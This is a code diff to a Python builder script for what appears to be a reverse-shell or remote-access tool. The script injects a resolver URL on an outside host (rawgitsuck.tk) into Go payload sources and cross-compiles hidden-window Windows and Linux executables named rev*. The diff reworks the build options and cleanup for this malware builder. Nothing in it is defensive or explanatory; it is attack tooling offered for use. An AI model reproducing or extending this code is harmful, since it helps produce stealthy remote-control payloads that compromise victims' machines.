@@ -208,16 +208,24 @@ def callanimation():
     the_process.start() 
     return the_process
 
-def writeonrev():
-    global repo,homedir
+def writeonrev(option):
+    global repo,homedir,repox
     line_to_replace = 44
-    git = repo.replace("https://github.com" , "https://raw.githubusercontent.com").split("/")
+    if repox == "":
+        git = repo.replace("https://github.com" , "https://raw.githubusercontent.com").split("/")
+    else:
+        git = repox.replace("https://github.com" , "https://raw.githubusercontent.com").split("/")
     git[1] = "//"
-    rawgit =  "http://rawgitsuck.tk/raw?git=" + rawtogit(git) + "/master/urlx.txt"
+    if rawtogit(git).endswith(".git"):
+        rawgit =  "http://rawgitsuck.tk/raw?git=" + rawtogit(git)[:-4] + "/master/urlx.txt"
+    else:
+        rawgit =  "http://rawgitsuck.tk/raw?git=" + rawtogit(git) + "/master/urlx.txt"
     text = 	"""\turlx, _ := reciver(string("{rawgit}"))""".format(rawgit=rawgit)
     printfc( "###UrL Resolver set to >>> " + str(rawgit),"green")
-    rev = homedir + linx() + "go" + linx() + "src" + linx() + "rev" + linx() + "rev.go"
-    rev = homedir + linx() + "go" + linx() + "src" + linx() + "rev" + linx() + "winrev.go"
+    if option == 3 or option == 4:
+        rev = homedir + linx() + "go" + linx() + "src" + linx() + "rev" + linx() + "rev.go"
+    else:
+        rev = homedir + linx() + "go" + linx() + "src" + linx() + "rev" + linx() + "winrev.go"
     with open(rev, 'r') as file:
         lines = file.readlines()
     if len(lines) > int(line_to_replace):
@@ -230,7 +238,6 @@ def builder():
     rev = homedir + linx() + "go" + linx() + "src" + linx() + "rev" + linx() + "rev.go"
     winrev = homedir + linx() + "go" + linx() + "src" + linx() + "rev" + linx() + "winrev.go"
     if checkbuildingconf():
-        writeonrev()
         printfc("###Select os and arch >>> ","green")
         printfc("#1.Windows 64","cyan")
         printfc("#2.Windows 32","cyan")
@@ -245,43 +252,47 @@ def builder():
             win = True
         else:
             win = False
-        if options == 1:
-            printfc("###Start compiling the payload >>> ","yellow")
-            com = callanimation()
-            if win:
-                subprocess.call('powershell.exe $Env:GOOS = \\"windows\\"; $Env:GOARCH = \\"amd64\\"; go build -ldflags  \\"-s -w\\" -ldflags -H=windowsgui -o revW64.exe "' + winrev, shell=True)
+        try:
+            writeonrev(options)
+            if options == 1:
+                printfc("###Start compiling the payload >>> ","yellow")
+                com = callanimation()
+                if win:
+                    subprocess.call('powershell.exe $Env:GOOS = \\"windows\\"; $Env:GOARCH = \\"amd64\\"; go build -ldflags  \\"-s -w\\" -ldflags -H=windowsgui -o revW64.exe "' + winrev, shell=True)
+                else:
+                    os.system("env GOOS=windows GOARCH=amd64 go build -ldflags  \"-s -w\" -ldflags -H=windowsgui -o revW64.exe " + winrev)
+                comx = "Build successfull >>> {rev}".format(rev=os.getcwd()+linx()+"revW64.exe")
+                com.join()
+            elif options == 2:
+                printfc("###Start compiling the payload >>> ","yellow")
+                com = callanimation()
+                if win:
+                    subprocess.call('powershell.exe $Env:GOOS = \\"windows\\"; $Env:GOARCH = \\"386\\"; go build -ldflags  \\"-s -w\\" -ldflags -H=windowsgui -o revW32.exe "' + winrev, shell=True)
+                else:
+                    os.system("env GOOS=windows GOARCH=386 go build -ldflags  \"-s -w\" -ldflags -H=windowsgui -o revW32.exe " + winrev)
+                comx = "Build successfull >>> {rev}".format(rev=os.getcwd()+linx()+"revW32.exe")
+                com.join()
+            elif options == 3:
+                printfc("###Start compiling the payload >>> ","yellow")
+                com = callanimation()
+                if win:
+                    subprocess.call('powershell.exe $Env:GOOS = \\"linux\\"; $Env:GOARCH = \\"amd64\\"; go build -ldflags  \\"-s -w\\" -o revL64 "' + rev, shell=True)
+                else:
+                    os.system("env GOOS=linux GOARCH=amd64 go build -ldflags \"-s -w\" -o revL64 " + rev)
+                comx = "Build successfull >>> {rev}".format(rev=os.getcwd()+linx()+"revL64")
+                com.join()
+            elif options == 4:
+                printfc("###Start compiling the payload >>> ","yellow")
+                com = callanimation()
+                if win:
+                    subprocess.call('powershell.exe $Env:GOOS = \\"linux\\"; $Env:GOARCH = \\"386\\"; go build -ldflags  \\"-s -w\\" -o revL32 "' + rev, shell=True)
+                else:
+                    os.system("env GOOS=linux GOARCH=386 go build -ldflags \"-s -w\" -o revL32 " + rev)
+                comx = "Build successfull >>> {rev}".format(rev=os.getcwd()+linx()+"revL32")
+                com.join()
             else:
-                os.system("env GOOS=windows GOARCH=amd64 go build -ldflags  \"-s -w\" -ldflags -H=windowsgui -o revW64.exe " + winrev)
-            comx = "Build successfull >>> {rev}".format(rev=os.getcwd()+linx()+"revW64.exe")
-            com.join()
-        elif options == 2:
-            printfc("###Start compiling the payload >>> ","yellow")
-            com = callanimation()
-            if win:
-                subprocess.call('powershell.exe $Env:GOOS = \\"windows\\"; $Env:GOARCH = \\"386\\"; go build -ldflags  \\"-s -w\\" -ldflags -H=windowsgui -o revW32.exe "' + winrev, shell=True)
-            else:
-                os.system("env GOOS=windows GOARCH=386 go build -ldflags  \"-s -w\" -ldflags -H=windowsgui -o revW32.exe " + winrev)
-            comx = "Build successfull >>> {rev}".format(rev=os.getcwd()+linx()+"revW32.exe")
-            com.join()
-        elif options == 3:
-            printfc("###Start compiling the payload >>> ","yellow")
-            com = callanimation()
-            if win:
-                subprocess.call('powershell.exe $Env:GOOS = \\"linux\\"; $Env:GOARCH = \\"amd64\\"; go build -ldflags  \\"-s -w\\" -o revL64 "' + rev, shell=True)
-            else:
-                os.system("env GOOS=linux GOARCH=amd64 go build -ldflags \"-s -w\" -o revL64 " + rev)
-            comx = "Build successfull >>> {rev}".format(rev=os.getcwd()+linx()+"revL64")
-            com.join()
-        elif options == 4:
-            printfc("###Start compiling the payload >>> ","yellow")
-            com = callanimation()
-            if win:
-                subprocess.call('powershell.exe $Env:GOOS = \\"linux\\"; $Env:GOARCH = \\"386\\"; go build -ldflags  \\"-s -w\\" -o revL32 "' + rev, shell=True)
-            else:
-                os.system("env GOOS=linux GOARCH=386 go build -ldflags \"-s -w\" -o revL32 " + rev)
-            comx = "Build successfull >>> {rev}".format(rev=os.getcwd()+linx()+"revL32")
-            com.join()
-        else:
+                printfc("Please select a valid option","red")
+        except:
             printfc("Please select a valid option","red")
     else:
         pass
@@ -290,7 +301,6 @@ def helper():
     help = """
     {{
         ####Configration>>>
-        	!command {{ ###run localy os command }}
             app::build {{ ###build payload >>> }}
             app::config {{ ###Change github repo and reconfigure >>> }}
             app::quit {{ ###quit >>> }}
@@ -337,7 +347,11 @@ def sendcommand():
             elif command[1] == "config":
                 printfc("removing old config.json", "red")
                 try:
+                    rev = homedir + linx() + "go" + linx() + "src" + linx() + "rev" + linx() + "rev.go"
+                    winrev = homedir + linx() + "go" + linx() + "src" + linx() + "rev" + linx() + "winrev.go"
                     os.remove("config.json")
+                    os.remove(rev)
+                    os.remove(winrev)
                 except:
                     pass
                 if setconfig():
